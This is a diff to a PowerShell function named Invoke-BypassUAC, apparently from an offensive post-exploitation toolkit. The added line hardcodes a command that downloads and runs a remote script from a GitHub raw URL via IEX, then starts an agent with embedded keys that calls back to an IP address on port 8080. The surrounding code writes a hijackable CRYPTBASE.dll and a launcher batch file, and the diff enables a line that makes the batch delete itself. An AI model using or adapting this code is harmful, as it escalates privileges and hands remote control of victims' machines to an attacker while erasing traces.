@@ -500,15 +500,15 @@ function Invoke-BypassUAC
         if ($Command -eq "") {
             throw "Either PayloadPath or Command must be specified."
         }
-
+        $Command = "powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kbleez/test/master/blah.ps1'); Agent -key T0pMLyN4L0InPVw9RW5Bdg== -eip 10.130.59.65 -ep 8080 -ek dVlYfihvTk1MNzo5O3N3ZCo+el4vMEhFayN8IXs/Uy4="
         $TempPayloadPath = $env:Temp + "\CRYPTBASE.dll"
         $BatchPath = $env:Temp + "\debug.bat"
 
         # build the launcher .bat
         "@echo off\n" | Out-File -Encoding ASCII -Append $BatchPath 
         "start /b $Command" | Out-File -Encoding ASCII -Append $BatchPath 
-        $Command | Out-File C:\Users\Public\fjiowejfoiwejoi.txt
-        #'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $BatchPath
+        #$Command | Out-File C:\Users\Public\fjiowejfoiwejoi.txt
+        'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $BatchPath
 
         Write-HijackDll -OutputFile $TempPayloadPath -BatchPath $BatchPath
         Write-Verbose "Hijackable .dll written to $TempPayloadPath"
